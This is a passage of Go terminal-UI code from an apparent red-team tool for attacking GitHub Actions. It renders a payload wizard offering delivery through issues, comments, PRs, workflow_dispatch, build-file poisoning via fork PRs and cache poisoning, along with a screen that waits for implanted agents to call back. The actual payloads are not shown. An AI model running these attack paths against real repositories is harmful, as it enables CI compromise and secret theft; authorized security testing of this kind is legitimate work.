			pad+genStyle.Render(fmt.Sprintf("  [1] %s %s", genMarker, sw.GeneratedName)),
		)

		custMarker := "○"
		custStyle := mutedColor
		if sw.OperatorNameChoice == OperatorNameCustom {
			custMarker = "●"
			custStyle = secondaryColorStyle
		}
		lines = append(lines,
			pad+custStyle.Render(fmt.Sprintf("  [2] %s Custom name", custMarker)),
		)
		if sw.OperatorNameChoice == OperatorNameCustom {
			lines = append(lines,
				pad+"",
				pad+"      "+m.setupInput.View(),
			)
		}
		lines = append(lines, pad+"")

	case 4:
		lines = append(lines,
			pad+"  Step 4: Deploy Key",
			pad+"",
			pad+"  "+mutedColor.Render("authorized_keys line:"),
			pad+"",
		)
		akLine := sw.AuthKeysLine
		if len(akLine) > boxWidth-4 {
			akLine = akLine[:boxWidth-7] + "..."
		}
		lines = append(lines, pad+"  "+mutedColor.Render(akLine), pad+"")

		deployOptions := []struct {
			label string
			desc  string
		}{
			{"Copy to clipboard (Recommended)", "Paste into ~/.smokedmeat/authorized_keys on Kitchen host"},
			{"Deploy via SSH", fmt.Sprintf("ssh %s 'mkdir -p ~/.smokedmeat && echo ... >> authorized_keys'", extractHost(sw.KitchenURL))},
			{"Skip (key already on server)", "For reusing an existing operator name/key"},
		}
		for i, opt := range deployOptions {
			marker := "○"
			style := mutedColor
			if KeyDeployMethod(i) == sw.DeployMethod {
				marker = "●"
				style = secondaryColorStyle
			}
			lines = append(lines,
				pad+style.Render(fmt.Sprintf("  [%d] %s %s", i+1, marker, opt.label)),
				pad+mutedColor.Render("      "+opt.desc),
			)
		}
		lines = append(lines, pad+"")

	case 5:
		lines = append(lines,
			pad+"  Step 5: GitHub Token",
		)
		switch sw.TokenSubStep {
		case setupTokenSubStepChoice:
			lines = append(lines,
				pad+"",
				pad+"  Select how to provide a GitHub token for scanning:",
				pad+"",
			)
			tokenOptions := []struct {
				label string
			}{
				{"Paste a Personal Access Token"},
				{"Use GitHub CLI (gh auth token)"},
				{"Use 1Password (op read)"},
				{"Create new PAT in browser"},
			}
			for i, opt := range tokenOptions {
				marker := "○"
				style := mutedColor
				if SetupTokenChoice(i) == sw.TokenChoice {
					marker = "●"
					style = secondaryColorStyle
				}
				lines = append(lines,
					pad+style.Render(fmt.Sprintf("  [%d] %s %s", i+1, marker, opt.label)),
				)
			}
		case setupTokenSubStepWarning:
			lines = append(lines,
				pad+"",
				pad+"  "+warningColor.Render("⚠ Fine-grained PAT detected"),
				pad+"",
				pad+"  "+mutedColor.Render("Classic PAT is recommended for first access."),
				pad+"  "+mutedColor.Render("Fine-grained PATs can be too restrictive for"),
				pad+"  "+mutedColor.Render("public cross-org testing scenarios."),
				pad+"",
				pad+"  "+mutedColor.Render("Press Enter to continue or Tab to choose a different token."),
			)
		default:
			lines = append(lines,
				pad+"",
			)
			switch sw.TokenChoice {
			case SetupTokenPAT:
				lines = append(lines,
					pad+"  Paste your token:",
					pad+"",
					pad+"  "+m.setupInput.View(),
				)
			case SetupTokenOP:
				lines = append(lines,
					pad+"  Enter 1Password reference:",
					pad+"",
					pad+"  "+m.setupInput.View(),
					pad+"  "+mutedColor.Render("Format: op://Vault/Item/field"),
				)
			case SetupTokenBrowser:
				lines = append(lines,
					pad+"  Paste the token you created:",
					pad+"",
					pad+"  "+m.setupInput.View(),
				)
			}
		}

		if sw.TokenOwner != "" {
			lines = append(lines, pad+"", pad+"  "+successColor.Render("Token owner: "+sw.TokenOwner))
		}
		if sw.TokenScopes != "" {
			lines = append(lines, pad+"  "+mutedColor.Render("Scopes: "+sw.TokenScopes))
		}
		lines = append(lines, pad+"")

	case 6:
		lines = append(lines,
			pad+"  Step 6: Target",
			pad+"",
			pad+"  What do you want to analyze?",
			pad+"",
		)
		if sw.TargetSubStep == 0 {
			targetOptions := []struct {
				label string
			}{
				{"Organization"},
				{"Single Repository"},
			}
			for i, opt := range targetOptions {
				marker := "○"
				style := mutedColor
				if SetupTargetChoice(i) == sw.TargetChoice {
					marker = "●"
					style = secondaryColorStyle
				}
				lines = append(lines,
					pad+style.Render(fmt.Sprintf("  [%d] %s %s", i+1, marker, opt.label)),
				)
			}
		} else {
			lines = append(lines,
				pad+"  "+m.setupInput.View(),
			)
		}
		lines = append(lines, pad+"")

	case 7:
		lines = append(lines,
			pad+"  Step 7: Analyze",
			pad+"",
		)
		switch {
		case sw.AnalysisRetryPending:
			targetLabel := sw.TargetValue
			if targetLabel == "" {
				targetLabel = m.target
			}
			lines = append(lines,
				pad+"  "+mutedColor.Render("Retrying poutine analysis..."),
				pad+"",
				pad+"  "+mutedColor.Render("Target: "+targetLabel),
			)
		case sw.AnalysisRunning:
			spinnerFrames := []string{"◐", "◓", "◑", "◒"}
			elapsed := time.Since(sw.AnalysisStart)
			spinnerIdx := int(elapsed.Seconds()) % len(spinnerFrames)
			spinner := spinnerFrames[spinnerIdx]

			targetLabel := sw.TargetValue
			if targetLabel == "" {
				targetLabel = m.target
			}
			lines = append(lines,
				pad+"  "+spinner+" Running poutine analysis...          "+mutedColor.Render(fmt.Sprintf("(elapsed: %s)", formatWaitingDuration(elapsed))),
				pad+"",
				pad+"  "+mutedColor.Render("Target: "+targetLabel),
			)
		case sw.AnalysisSummary != "":
			lines = append(lines,
				pad+"  "+successColor.Render("✓ Analysis complete"),
				pad+"",
				pad+fmt.Sprintf("    %d repos analyzed", sw.ReposAnalyzed),
				pad+fmt.Sprintf("    %d vulnerabilities found", sw.VulnsFound),
			)
			if sw.SecretsFound > 0 {
				lines = append(lines, pad+fmt.Sprintf("    %d secrets detected", sw.SecretsFound))
			}
			lines = append(lines, pad+"")
		default:
		}
		lines = append(lines, pad+"")
	}

	if sw.Status != "" {
		lines = append(lines, pad+"  "+secondaryColorStyle.Render(sw.Status))
	}
	if sw.Error != "" {
		lines = append(lines, pad+"  "+errorColor.Render(sw.Error))
	}

	lines = append(lines, pad+strings.Repeat("─", boxWidth))

	targetHeight := height + fixedInputHeight + m.activityRegionHeight()
	for len(lines) < targetHeight {
		lines = append(lines, "")
	}

	return strings.Join(lines[:targetHeight], "\n")
}

func (m *Model) renderWaitingView(height int) string {
	var lines []string

	// Center the content vertically
	topPad := (height - 20) / 2
	if topPad < 0 {
		topPad = 0
	}
	for i := 0; i < topPad; i++ {
		lines = append(lines, "")
	}

	// Spinner frames
	spinnerFrames := []string{"◐", "◓", "◑", "◒"}
	spinnerIdx := int(m.phaseStart.Unix()) % len(spinnerFrames)
	if m.waiting != nil {
		spinnerIdx = int(m.waiting.Elapsed().Seconds()) % len(spinnerFrames)
	}
	spinner := spinnerFrames[spinnerIdx]

	// Title
	switch {
	case m.waiting != nil && m.waiting.IsTimedOut():
		lines = append(lines,
			centerText("AGENT DID NOT PHONE HOME", m.width),
			centerText(strings.Repeat("─", 24), m.width),
		)
	case m.waiting != nil && m.waiting.CachePoison != nil && m.waiting.CachePoison.WriterAgentID != "":
		lines = append(lines,
			centerText("WAITING FOR CACHE VICTIM", m.width),
			centerText(strings.Repeat("─", 24), m.width),
		)
	default:
		lines = append(lines,
			centerText("WAITING FOR AGENT", m.width),
			centerText(strings.Repeat("─", 17), m.width),
		)
	}
	lines = append(lines, "")

	// Spinner or status
	if m.waiting != nil {
		switch {
		case m.waiting.IsTimedOut():
			lines = append(lines, centerText("Elapsed: 15:00  ✗", m.width))
		case m.waiting.IsWarning():
			elapsed := m.waiting.Elapsed().Truncate(time.Second)
			eta := waitingETA(m.waiting.Method)
			lines = append(lines,
				centerText(spinner, m.width),
				"",
				centerText(fmt.Sprintf("Elapsed: %s  ETA: overdue  ⚠️", formatWaitingDuration(elapsed)), m.width),
				"",
				centerText(warningColor.Render(fmt.Sprintf("Taking longer than the usual %s callback window.", formatWaitingDuration(eta))), m.width),
			)
		default:
			elapsed := m.waiting.Elapsed().Truncate(time.Second)
			eta := waitingETA(m.waiting.Method)
			remaining := eta - elapsed
			etaText := "overdue"
			if remaining > 0 {
				etaText = "~" + formatWaitingDuration(remaining)
			}
			lines = append(lines,
				centerText(spinner, m.width),
				"",
				centerText(fmt.Sprintf("Elapsed: %s  ETA: %s", formatWaitingDuration(elapsed), etaText), m.width),
			)
		}

		// Details
		lines = append(lines,
			"",
			centerText(fmt.Sprintf("Stager: %s", m.waiting.StagerID), m.width),
			centerText(fmt.Sprintf("Target: %s", m.waiting.TargetRepo), m.width),
			centerText(fmt.Sprintf("Method: %s", m.waiting.Method), m.width),
		)
		if m.waiting.CachePoison != nil {
			writerStatus := mutedColor.Render("pending")
			if m.waiting.CachePoison.WriterAgentID != "" {
				writerStatus = successColor.Render("received")
			}
			writerCacheStatus := mutedColor.Render("pending")
			if status := m.waiting.CachePoison.WriterStatus; status != nil {
				switch strings.TrimSpace(status.Status) {
				case "armed":
					writerCacheStatus = successColor.Render("armed")
				case "failed":
					writerCacheStatus = errorColor.Render("failed")
				default:
					writerCacheStatus = warningColor.Render(strings.TrimSpace(status.Status))
				}
			}
			victimStatus := mutedColor.Render("waiting")
			if m.waiting.CachePoison.VictimAgentID != "" {
				victimStatus = successColor.Render("connected")
			}
			lines = append(lines,
				centerText(fmt.Sprintf("Writer: %s", m.waiting.TargetWorkflow), m.width),
				centerText(fmt.Sprintf("Victim: %s", m.waiting.CachePoison.Victim.Workflow), m.width),
				centerText(fmt.Sprintf("Writer callback: %s", writerStatus), m.width),
				centerText(fmt.Sprintf("Writer cache: %s", writerCacheStatus), m.width),
				centerText(fmt.Sprintf("Victim callback: %s", victimStatus), m.width),
			)
		}

		if m.waiting.PRURL != "" {
			prLink := Hyperlink(m.waiting.PRURL, "PR: "+m.waiting.PRURL+" (click or press 'o')")
			lines = append(lines, "", centerText(prLink, m.width))
		}

		if !m.waiting.IsTimedOut() {
			tips := waitingTipsForMethod(m.waiting.Method)
			lines = append(lines,
				"",
				centerText(strings.Repeat("─", 60), m.width),
				"",
				centerText("Troubleshooting:", m.width),
			)
			for _, tip := range tips {
				lines = append(lines, centerText("• "+tip, m.width))
			}
		} else {
			// Timeout options
			lines = append(lines,
				"",
				centerText("Possible causes:", m.width),
				centerText("• Egress filtering blocked the callback", m.width),
				centerText("• Workflow didn't trigger or failed early", m.width),
				centerText("• Payload syntax error in target shell", m.width),
				"",
				centerText("[1] View workflow run logs (opens browser)", m.width),
				centerText("[2] Try different delivery method", m.width),
				centerText("[3] Return to findings", m.width),
			)
		}
	}

	// Pad to fill height
	for len(lines) < height {
		lines = append(lines, "")
	}

	return strings.Join(lines[:height], "\n")
}

func (m *Model) renderWizardOverlay(background string, height int) string {
	if m.wizard == nil {
		return background
	}

	modalWidth := 90
	if m.width < 100 {
		modalWidth = m.width - 10
	}
	modalHeight := 26
	if height < 30 {
		modalHeight = height - 4
	}
	if modalHeight < 16 {
		modalHeight = 16
	}

	modalLines := m.buildWizardModal(modalWidth, modalHeight)
	modal := strings.Join(modalLines, "\n")
	result := compositeCenter(modal, dimBackground(background), m.width, height)
	lines := strings.Split(result, "\n")
	for len(lines) < height {
		lines = append(lines, strings.Repeat(" ", m.width))
	}
	return strings.Join(lines[:height], "\n")
}

func (m *Model) buildWizardModal(width, height int) []string {
	var lines []string

	// Yellow border characters
	bTop := modalBorderStyle.Render("┌" + strings.Repeat("─", width-2) + "┐")
	bLeft := modalBorderStyle.Render("│")
	bRight := modalBorderStyle.Render("│")
	bBottom := modalBorderStyle.Render("└" + strings.Repeat("─", width-2) + "┘")
	bSep := modalBorderStyle.Render("─")

	// Top border
	lines = append(lines, bTop)

	// Title bar with red background (like header)
	stepInfo := fmt.Sprintf("Step %d/3", m.wizard.Step)
	title := " PAYLOAD WIZARD"
	innerWidth := width - 2
	spacing := innerWidth - len(title) - len(stepInfo) - 1
	if spacing < 1 {
		spacing = 1
	}
	titleContent := title + strings.Repeat(" ", spacing) + stepInfo + " "
	styledTitle := modalTitleStyle.Width(innerWidth).Render(titleContent)
	lines = append(lines,
		bLeft+styledTitle+bRight,
		bLeft+strings.Repeat(" ", width-2)+bRight,
	)

	// Content lines need yellow borders
	var contentLines []string
	switch m.wizard.Step {
	case 1:
		contentLines = m.buildWizardStep1Content(width)
	case 2:
		contentLines = m.buildWizardStep2Content(width)
	case 3:
		contentLines = m.buildWizardStep3Content(width)
	}
	for _, line := range contentLines {
		if len(lines) >= height-3 {
			break
		}
		lines = append(lines, bLeft+line+bRight)
	}

	for len(lines) < height-3 {
		lines = append(lines, bLeft+strings.Repeat(" ", width-2)+bRight)
	}

	// Navigation hints footer
	var hints string
	switch m.wizard.Step {
	case 1:
		hints = helpKeyStyle.Render("Enter") + helpDescStyle.Render(":continue  ") +
			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":cancel")
	case 2:
		optCount := len(ApplicableDeliveryMethods(m.wizard.SelectedVuln))
		hints = helpKeyStyle.Render(fmt.Sprintf("1-%d", optCount)) + helpDescStyle.Render(":select  ") +
			helpKeyStyle.Render("Enter") + helpDescStyle.Render(":continue  ") +
			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":back")
	case 3:
		action := ":deploy  "
		dwellHint := ""
		switch m.wizard.DeliveryMethod {
		case DeliveryCopyOnly, DeliveryManualSteps:
			action = ":copy  "
		case DeliveryIssue, DeliveryComment, DeliveryAutoPR:
			dwellHint = helpKeyStyle.Render("d") + helpDescStyle.Render(":dwell  ")
		}
		hints = helpKeyStyle.Render("Enter") + helpDescStyle.Render(action) + dwellHint +
			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":back")
	}
	hintsWidth := lipgloss.Width(hints)
	hintsPadding := width - 4 - hintsWidth
	if hintsPadding < 0 {
		hintsPadding = 0
	}
	lines = append(lines,
		bLeft+" "+strings.Repeat(bSep, width-4)+" "+bRight,
		bLeft+" "+hints+strings.Repeat(" ", hintsPadding)+" "+bRight,
		bBottom,
	)

	// Pad each line to exact visual width to prevent background bleed-through
	for i, line := range lines {
		visualWidth := lipgloss.Width(line)
		if visualWidth < width {
			lines[i] = line + strings.Repeat(" ", width-visualWidth)
		}
	}

	return lines
}

func (m *Model) buildWizardStep1Content(width int) []string {
	var lines []string
	innerWidth := width - 2
	pad := "  "
	emptyLine := strings.Repeat(" ", innerWidth)

	if m.wizard.SelectedVuln != nil {
		v := m.wizard.SelectedVuln
		vulnClass := vulnClassFromRuleID(v.RuleID, v.Context)
		isPwnRequest := v.RuleID == "untrusted_checkout_exec"

		lines = append(lines,
			formatWizardContent(pad, "", secondaryColorStyle.Render(vulnClass), innerWidth),
			formatWizardContent(pad, "Trigger:", warningColor.Render(v.Trigger), innerWidth),
			emptyLine,
		)

		lineStr := fmt.Sprintf("%d", v.Line)
		if v.Line == 0 {
			lineStr = "-"
		}
		jobStr := v.Job
		if jobStr == "" {
			jobStr = "-"
		}
		lines = append(lines,
			formatWizardContent(pad, "Repository:", mutedColor.Render(v.Repository), innerWidth),
			formatWizardContent(pad, "Workflow:", mutedColor.Render(v.Workflow), innerWidth),
			formatWizardContent(pad, "Job:", mutedColor.Render(jobStr), innerWidth),
			formatWizardContent(pad, "Line:", mutedColor.Render(lineStr), innerWidth),
			emptyLine,
		)

		expr := v.Expression
		if len(expr) > innerWidth-8 {
			expr = expr[:innerWidth-11] + "..."
		}
		if isPwnRequest {
			lines = append(lines,
				formatWizardContent(pad, "Detection:", expr, innerWidth),
			)
			if v.LOTPTool != "" || v.LOTPAction != "" {
				toolName := v.LOTPTool
				if toolName == "" {
					toolName = v.LOTPAction
				}
				lines = append(lines,
					formatWizardContent(pad, "Tool:", warningColor.Render(toolName), innerWidth),
				)
			}
			if len(v.LOTPTargets) > 0 {
				lines = append(lines,
					formatWizardContent(pad, "Targets:", warningColor.Render(strings.Join(v.LOTPTargets, ", ")), innerWidth),
				)
			}
		} else {
			lines = append(lines,
				formatWizardContent(pad, "Expression:", successColor.Render(expr), innerWidth),
			)
		}

		if v.GateRaw != "" {
			lines = append(lines, emptyLine)
			if v.GateUnsolvable != "" {
				lines = append(lines,
					formatWizardContent(pad, "Gate:", warningColor.Render("manual — "+v.GateUnsolvable), innerWidth),
					formatWizardContent(pad, "", mutedColor.Render(truncateForWidth(v.GateRaw, innerWidth-4)), innerWidth),
				)
			} else if len(v.GateTriggers) > 0 {
				triggerText := strings.Join(v.GateTriggers, " + ")
				lines = append(lines,
					formatWizardContent(pad, "Gate:", successColor.Render("auto-prepend ")+mutedColor.Render(truncateForWidth(triggerText, innerWidth-20)), innerWidth),
				)
			}
		}
	}

	return lines
}

func (m *Model) buildWizardStep2Content(width int) []string {
	var lines []string
	innerWidth := width - 2
	pad := "  "
	emptyLine := strings.Repeat(" ", innerWidth)

	lines = append(lines,
		formatWizardContent(pad, "", "How do you want to deploy the payload?", innerWidth),
		emptyLine,
		formatWizardContent(pad, "", warningColor.Render("⚠️  Proceed only if authorized. This will create real artifacts."), innerWidth),
		emptyLine,
	)

	applicable := ApplicableDeliveryMethods(m.wizard.SelectedVuln)
	options := m.getDeliveryOptions(applicable)
	recommendedIndex := -1
	recommendedRank := -1

	for i, opt := range options {
		state, _ := m.deliveryMethodStatus(opt.method)
		rank := preferredDeliveryStatusRank(state)
		if rank > recommendedRank {
			recommendedRank = rank
			recommendedIndex = i
		}
	}

	for i, opt := range options {
		marker := "○"
		if m.wizard.DeliveryMethod == opt.method {
			marker = "●"
		}

		state, reason := m.deliveryMethodStatus(opt.method)
		label := opt.label
		desc := opt.desc

		if i == recommendedIndex && state != deployStateFail && state != deployStateDenied {
			label += successColor.Render(" Recommended")
		}
		switch state {
		case deployStateConfirmed:
			label += successColor.Render(" (worked before)")
			desc = mutedColor.Render(desc)
		case deployStatePass:
			desc = mutedColor.Render(desc)
		case deployStateUnknown:
			if reason != "" {
				desc = mutedColor.Render(reason)
			} else {
				desc = mutedColor.Render(desc)
			}
		case deployStateDenied:
			label = mutedColor.Render(opt.label) + errorColor.Render(" (denied)")
			if reason != "" {
				desc = mutedColor.Render(reason)
			} else {
				desc = mutedColor.Render(opt.desc)
			}
		default:
			label = mutedColor.Render(opt.label) + warningColor.Render(" (blocked)")
			if reason != "" {
				desc = mutedColor.Render(reason)
			} else {
				desc = mutedColor.Render(opt.desc)
			}
		}
		if state == deployStatePass || state == deployStateConfirmed {
			desc = mutedColor.Render(desc)
		}

		lines = append(lines,
			formatWizardContent(pad, fmt.Sprintf("[%d] %s", i+1, marker), label, innerWidth),
			formatWizardContent(pad, "     ", desc, innerWidth),
			emptyLine,
		)
	}

	if m.wizard.PreflightLoading {
		lines = append(lines, formatWizardContent(pad, "", warningColor.Render("Checking token and target access..."), innerWidth))
	}
	if m.wizard.PreflightError != "" {
		lines = append(lines, formatWizardContent(pad, "", warningColor.Render("GitHub check unavailable: "+m.wizard.PreflightError), innerWidth))
	}

	if m.tokenInfo != nil {
		scopeInfo := fmt.Sprintf("Token: %s | Scopes: %s", m.tokenInfo.DisplaySource(), m.tokenInfo.ScopeSummary())
		lines = append(lines, formatWizardContent(pad, "", mutedColor.Render(scopeInfo), innerWidth))
	} else {
		lines = append(lines, formatWizardContent(pad, "", mutedColor.Render("No token set - only manual options available"), innerWidth))
	}

	return lines
}

type deliveryOption struct {
	method DeliveryMethod
	label  string
	desc   string
}

func (m *Model) getDeliveryOptions(applicable []DeliveryMethod) []deliveryOption {
	issueOpt := deliveryOption{DeliveryIssue, "Create Issue", "Simplest: gh issue create with payload"}
	if m.wizard != nil && m.wizard.SelectedVuln != nil && isCommentInjection(m.wizard.SelectedVuln) {
		issueOpt.label = "Create Issue then Add Comment"
		issueOpt.desc = "Creates issue then comments with payload (issue_comment trigger)"
	}

	allOptions := map[DeliveryMethod]deliveryOption{
		DeliveryIssue:        issueOpt,
		DeliveryComment:      {DeliveryComment, "Add Comment", "Comment on an existing issue or PR, or create a stub PR"},
		DeliveryAutoPR:       {DeliveryAutoPR, "Create PR", "Fork (if needed) and open pull request"},
		DeliveryLOTP:         m.lotpDeliveryOption(),
		DeliveryAutoDispatch: {DeliveryAutoDispatch, "Trigger Dispatch", "Use ephemeral token to trigger workflow_dispatch"},
		DeliveryCopyOnly:     {DeliveryCopyOnly, "Copy and deploy manually", "Copies payload to clipboard"},
		DeliveryManualSteps:  {DeliveryManualSteps, "Manual deploy (step-by-step)", "Copy payload and follow guided instructions"},
	}

	var result []deliveryOption
	for _, method := range applicable {
		if opt, ok := allOptions[method]; ok {
			result = append(result, opt)
		}
	}
	return result
}

func (m *Model) lotpDeliveryOption() deliveryOption {
	tool := "LOTP"
	desc := "Poison build file via fork PR"
	if m.wizard != nil && m.wizard.SelectedVuln != nil {
		v := m.wizard.SelectedVuln
		if v.LOTPTool != "" {
			tool = v.LOTPTool + " (LOTP)"
		} else if v.LOTPAction != "" {
			tool = v.LOTPAction + " (LOTP)"
		}
		if len(v.LOTPTargets) > 0 {
			desc = "Inject into " + strings.Join(v.LOTPTargets, ", ") + " via fork PR"
		}
	}
	return deliveryOption{DeliveryLOTP, tool, desc}
}

func (m *Model) buildWizardStep3Content(width int) []string {
	var lines []string
	innerWidth := width - 2
	pad := "  "
	emptyLine := strings.Repeat(" ", innerWidth)

	switch m.wizard.DeliveryMethod {
	case DeliveryLOTP:
		return m.buildWizardStep3LOTP(width)
	case DeliveryIssue:
		readyMsg := "Ready to create issue!"
		if m.wizard.SelectedVuln != nil && isCommentInjection(m.wizard.SelectedVuln) {
			readyMsg = "Ready to create issue + comment!"
		}
		lines = append(lines,
			formatWizardContent(pad, "", readyMsg, innerWidth),
			emptyLine,
			formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL CREATE A REAL ISSUE"), innerWidth),
			emptyLine,
		)
		lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
		lines = append(lines, m.renderAutoCloseOption(pad, innerWidth)...)
	case DeliveryComment:
		targets := m.availableCommentTargets()
		currentTarget := m.wizard.CommentTarget
		foundTarget := false
		for _, target := range targets {
			if target == currentTarget {
				foundTarget = true
				break
			}
		}
		if !foundTarget && len(targets) > 0 {
			currentTarget = targets[0]
		}
		targetLabel := currentTarget.String()
		if len(targets) > 1 {
			targetLabel += " [t]"
		}
		numberLabel := "Issue #:"
		hint := "(blank = auto-select first open issue)"
		switch currentTarget {
		case CommentTargetPullRequest:
			numberLabel = "PR #:"
			hint = "(enter an existing PR number)"
		case CommentTargetStubPullRequest:
			numberLabel = ""
			hint = "Create a neutral typo-fix PR, then add the payload comment."
		}
		lines = append(lines,
			formatWizardContent(pad, "", "Add comment to issue or PR", innerWidth),
			emptyLine,
			formatWizardContent(pad, "Target:", targetLabel, innerWidth),
		)
		state, reason := m.commentTargetStatus(currentTarget)
		switch {
		case state == deployStateConfirmed:
			lines = append(lines, formatWizardContent(pad, "", successColor.Render("This path worked before with this token"), innerWidth))
		case state == deployStateUnknown && reason != "":
			lines = append(lines, formatWizardContent(pad, "", warningColor.Render(reason), innerWidth))
		case (state == deployStateFail || state == deployStateDenied) && reason != "":
			lines = append(lines, formatWizardContent(pad, "", errorColor.Render(reason), innerWidth))
		}
		if currentTarget == CommentTargetStubPullRequest {
			lines = append(lines,
				formatWizardContent(pad, "", mutedColor.Render(hint), innerWidth),
				emptyLine,
			)
		} else {
			lines = append(lines,
				formatWizardContent(pad, numberLabel, m.wizardInput.View(), innerWidth),
				formatWizardContent(pad, "", mutedColor.Render(hint), innerWidth),
				emptyLine,
			)
		}
		lines = append(lines,
			emptyLine,
			formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL POST A REAL COMMENT"), innerWidth),
			emptyLine,
		)
		lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
		if currentTarget == CommentTargetStubPullRequest {
			lines = append(lines, m.renderAutoCloseOption(pad, innerWidth)...)
		}
	case DeliveryAutoPR:
		lines = append(lines,
			formatWizardContent(pad, "", "Ready to create PR!", innerWidth),
			emptyLine,
			formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL CREATE A REAL PULL REQUEST"), innerWidth),
			emptyLine,
		)
		lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
		lines = append(lines, m.renderDraftOption(pad, innerWidth)...)
		lines = append(lines, m.renderAutoCloseOption(pad, innerWidth)...)
	case DeliveryCopyOnly:
		lines = append(lines,
			formatWizardContent(pad, "", "Copy payload to clipboard", innerWidth),
			emptyLine,
		)
		lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
		if m.wizard.Payload != "" {
			lines = append(lines,
				formatWizardContent(pad, "", mutedColor.Render("Payload:"), innerWidth),
				formatWizardContent(pad, "", outputStyle.Render(truncatePayloadForModal(m.wizard.Payload, innerWidth-4)), innerWidth),
				emptyLine,
			)
		}
		lines = append(lines,
			formatWizardContent(pad, "", "Paste into an issue, comment, or PR body.", innerWidth),
			emptyLine,
		)
	case DeliveryManualSteps:
		lines = append(lines,
			formatWizardContent(pad, "", "Manual deployment steps:", innerWidth),
			emptyLine,
		)
		lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
		if m.wizard.SelectedVuln != nil {
			vuln := m.wizard.SelectedVuln
			trigger := strings.ToLower(vuln.Trigger)

			lotpName := vuln.LOTPTool
			if lotpName == "" {
				lotpName = vuln.LOTPAction
			}
			if vuln.RuleID == "untrusted_checkout_exec" && lotpName != "" {
				lines = append(lines,
					formatWizardContent(pad, "Tool:", lotpName, innerWidth),
				)
				if len(vuln.LOTPTargets) > 0 {
					lines = append(lines,
						formatWizardContent(pad, "Files:", strings.Join(vuln.LOTPTargets, ", "), innerWidth),
					)
				}
				lines = append(lines,
					formatWizardContent(pad, "Workflow:", vuln.Workflow, innerWidth),
					emptyLine,
					formatWizardContent(pad, "1.", "Fork "+vuln.Repository, innerWidth),
					formatWizardContent(pad, "2.", "Modify target file(s) with payload:", innerWidth),
				)
				if len(vuln.LOTPTargets) > 0 {
					for _, t := range vuln.LOTPTargets {
						lines = append(lines,
							formatWizardContent(pad, "", mutedColor.Render("   → "+t), innerWidth),
						)
					}
				}
				lines = append(lines, emptyLine)
				if m.wizard.Payload != "" {
					lines = append(lines,
						formatWizardContent(pad, "", outputStyle.Render(truncatePayloadForModal(m.wizard.Payload, innerWidth-4)), innerWidth),
						emptyLine,
					)
				}
				lines = append(lines,
					formatWizardContent(pad, "3.", "Open PR to upstream repository", innerWidth),
					formatWizardContent(pad, "4.", "Wait for CI to run "+lotpName+" on the PR branch", innerWidth),
					formatWizardContent(pad, "5.", "Watch for beacon callback", innerWidth),
					emptyLine,
				)
			} else {
				target := "issue/comment"
				if strings.Contains(trigger, "pull_request") && !strings.Contains(trigger, "issue") {
					target = "PR"
				}
				lines = append(lines,
					formatWizardContent(pad, "1.", "Go to github.com/"+vuln.Repository, innerWidth),
					formatWizardContent(pad, "2.", "Create new "+target+" with payload below:", innerWidth),
					emptyLine,
				)
				if m.wizard.Payload != "" {
					lines = append(lines,
						formatWizardContent(pad, "", outputStyle.Render(truncatePayloadForModal(m.wizard.Payload, innerWidth-4)), innerWidth),
						emptyLine,
					)
				}
				lines = append(lines,
					formatWizardContent(pad, "3.", "Submit and wait for workflow to trigger", innerWidth),
					formatWizardContent(pad, "4.", "Watch for beacon callback", innerWidth),
					emptyLine,
				)
			}
		}
	case DeliveryAutoDispatch:
		lines = append(lines,
			formatWizardContent(pad, "", "Trigger workflow_dispatch via API", innerWidth),
			emptyLine,
		)
		dispatchToken := m.dispatchCredential()
		if dispatchToken == nil {
			lines = append(lines,
				formatWizardContent(pad, "", errorColor.Render("⚠ No token with workflow_dispatch permission is ready"), innerWidth),
				formatWizardContent(pad, "", mutedColor.Render("Use a live GITHUB_TOKEN, App token, or PAT with repo/actions:write"), innerWidth),
				emptyLine,
			)
		} else {
			lines = append(lines,
				formatWizardContent(pad, "Token:", dispatchToken.Name+" "+dispatchToken.MaskedValue(), innerWidth),
			)
			if m.wizard.SelectedVuln != nil && len(m.wizard.SelectedVuln.InjectionSources) > 0 {
				inputName := extractDispatchInputName(m.wizard.SelectedVuln.InjectionSources)
				if inputName != "" {
					lines = append(lines, formatWizardContent(pad, "Input:", inputName, innerWidth))
				}
			}
			lines = append(lines,
				emptyLine,
				formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL TRIGGER THE WORKFLOW"), innerWidth),
				emptyLine,
			)
			lines = append(lines, m.renderDwellTimeOption(pad, innerWidth)...)
		}
	default:
		lines = append(lines,
			formatWizardContent(pad, "", "Ready to deploy!", innerWidth),
			emptyLine,
		)
	}

	statusState, statusReason := m.deliveryMethodStatus(m.wizard.DeliveryMethod)
	switch statusState {
	case deployStateConfirmed:
		lines = append(lines, formatWizardContent(pad, "", successColor.Render("This path worked before with this token"), innerWidth), emptyLine)
	case deployStateUnknown:
		if statusReason != "" {
			lines = append(lines, formatWizardContent(pad, "", warningColor.Render(statusReason), innerWidth), emptyLine)
		}
	case deployStateFail, deployStateDenied:
		if statusReason != "" {
			lines = append(lines, formatWizardContent(pad, "", errorColor.Render(statusReason), innerWidth), emptyLine)
		}
	}

	lines = append(lines, m.renderCachePoisonOption(pad, innerWidth)...)

	if m.wizard.SelectedVuln != nil {
		lines = append(lines, formatWizardContent(pad, "Repository:", m.wizard.SelectedVuln.Repository, innerWidth))
	}
	// Skip payload summary for methods that already show it above
	if m.wizard.Payload != "" && m.wizard.DeliveryMethod != DeliveryCopyOnly && m.wizard.DeliveryMethod != DeliveryManualSteps {
		payload := m.wizard.Payload
		if len(payload) > innerWidth-20 {
			payload = payload[:innerWidth-23] + "..."
		}
		label := "Payload:"
		switch m.wizard.DeliveryMethod {
		case DeliveryAutoPR:
			if m.wizard.SelectedVuln != nil && m.wizard.SelectedVuln.Context == "pr_title" {
				label = "PR Title:"
			} else if m.wizard.SelectedVuln != nil && m.wizard.SelectedVuln.Context == "pr_body" {
				label = "PR Body:"
			}
		case DeliveryIssue:
